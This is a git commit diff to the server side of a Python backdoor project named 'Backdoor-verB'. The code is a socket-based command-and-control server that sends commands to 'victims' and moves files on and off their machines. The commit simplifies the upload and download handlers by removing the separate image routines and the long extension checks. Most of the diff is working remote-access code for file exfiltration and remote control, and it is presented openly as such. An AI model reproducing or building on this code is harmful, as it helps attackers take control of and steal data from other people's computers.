b58bf7faef3ccb0c071b310c6085cb304248d15b
phoenixyork166 <berlinlee2017@gmail.com>
2024-02-12 17:28:04 +0800

    12 Feb 2024

--- Backdoor-verB/server.py
+++ Backdoor-verB/server.py
@@ -39,15 +39,6 @@ def upload_file(file_name):
     # read btyes
     f = open(file_name, 'rb')
     target.send(f.read())
-
-# Allow Server to upload complicated files 
-# e.g. images to victims
-# Similar to upload_file(file_name): in client.py
-def upload_image(file_name):
-    # open File from 'file_name' => command[9:]
-    # read btyes
-    f = open(file_name, 'rb+')
-    target.send(f.read())
           
 # SERVER download simple files from victims' machines
 # Callback used to download files from victims' machines
@@ -59,6 +50,7 @@ def download_file(file_name):
     f = open(file_name, 'wb')    
     # If timeout is NOT set, sometimes program will get stuck
     target.settimeout(1)
+    print(f'Starting to receive data of simple files...')
     # Receive data from multiple chunks
     chunk = target.recv(1024)
     # As long as there's something in chunk variable
@@ -67,31 +59,6 @@ def download_file(file_name):
         f.write(chunk)
         try:
             chunk = target.recv(1024)
-        # If there's any errors => reached End of file
-        except socket.timeout as e:
-            break
-        target.settimeout(None)
-        # Close file upon complete sending files from victims
-        f.close()
-
-# SERVER download complicated files e.g. images from victims' machines
-# Callback used to download files from victims' machines
-# Server => download files from victims' machines
-# Client => upload files to Server
-def download_image(file_name):
-    # open file object 'f' using 
-    # 'wb' => write bytes to a file
-    f = open(file_name, 'wb+')    
-    # If timeout is NOT set, sometimes program will get stuck
-    target.settimeout(1)
-    # Receive data from multiple chunks
-    chunk = target.recv(4096)
-    # As long as there's something in chunk variable
-    while chunk:
-        # Writing the chunk into file
-        f.write(chunk)
-        try:
-            chunk = target.recv(4096)
         # If there's any errors => reached End of file
         except socket.timeout as e:
             break
@@ -134,24 +101,11 @@ def target_communication():
         # 'download path/file.txt'
         # If first 8 CHAR == 'download'
         elif command[:8] == 'download':
-            # If files to be downloaded are Images
-            # use 'wb+'
-            # Example
-            # command = 'download happy.png'
-            # command[9:] => happy.png
-            # command[9:].split(".")[1] => png (file extensions)
-            if command[9:].split(".")[1] == 'jpg' or command[9:].split(".")[1] == 'jpeg' or command[9:].split(".")[1] == 'png' or command[9:].split(".")[1] == 'svg' or command[9:].split(".")[1] == 'gif' or command[9:].split(".")[1] == 'bmp' or command[9:].split(".")[1] == 'tiff' or command[9:].split(".")[1] == 'ico' or command[9:].split(".")[1] == 'mp3' or command[9:].split(".")[1] == 'mp4' or command[9:].split(".")[1] == 'mov' or command[9:].split(".")[1] == 'avi' or command[9:].split(".")[1] == 'wmv' or command[9:].split(".")[1] == 'avchd' or command[9:].split(".")[1] == 'webm' or command[9:].split(".")[1] == 'flv' or command[9:].split(".")[1] == 'mpg' or command[9:].split(".")[1] == 'mpeg':
-                download_image(command[9:])
-            else:
-                # FILE starts from 9th CHAR of command
-                download_file(command[9:])
+            download_file(command[9:])
         # Upload files to victims' machine from this SERVER
         elif command[:6] == 'upload':
-            if command[7:].split(".")[1] == 'jpg' or command[7:].split(".")[1] == 'jpeg' or command[7:].split(".")[1] == 'png' or command[7:].split(".")[1] == 'svg' or command[7:].split(".")[1] == 'gif' or command[7:].split(".")[1] == 'bmp' or command[7:].split(".")[1] == 'tiff' or command[7:].split(".")[1] == 'ico' or command[7:].split(".")[1] == 'mp3' or command[7:].split(".")[1] == 'mp4' or command[7:].split(".")[1] == 'mov' or command[7:].split(".")[1] == 'avi' or command[7:].split(".")[1] == 'wmv' or command[7:].split(".")[1] == 'avchd' or command[7:].split(".")[1] == 'webm' or command[7:].split(".")[1] == 'flv' or command[7:].split(".")[1] == 'mpg' or command[7:].split(".")[1] == 'mpeg':
-                upload_image(command[7:])
-            else:
-                # File starts from 7th CHAR till end
-                upload_file(command[7:])
+            # File starts from 7th CHAR till end
+            upload_file(command[7:])
         else:
             # A callback
             # To receive results from victims once we fire our commands
@@ -160,7 +114,6 @@ def target_communication():
             # return json.loads(data)
             print(result)
     
-
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # Binding our Server IP to the PORT
 sock.bind((IP_ADDRESS, PORT))
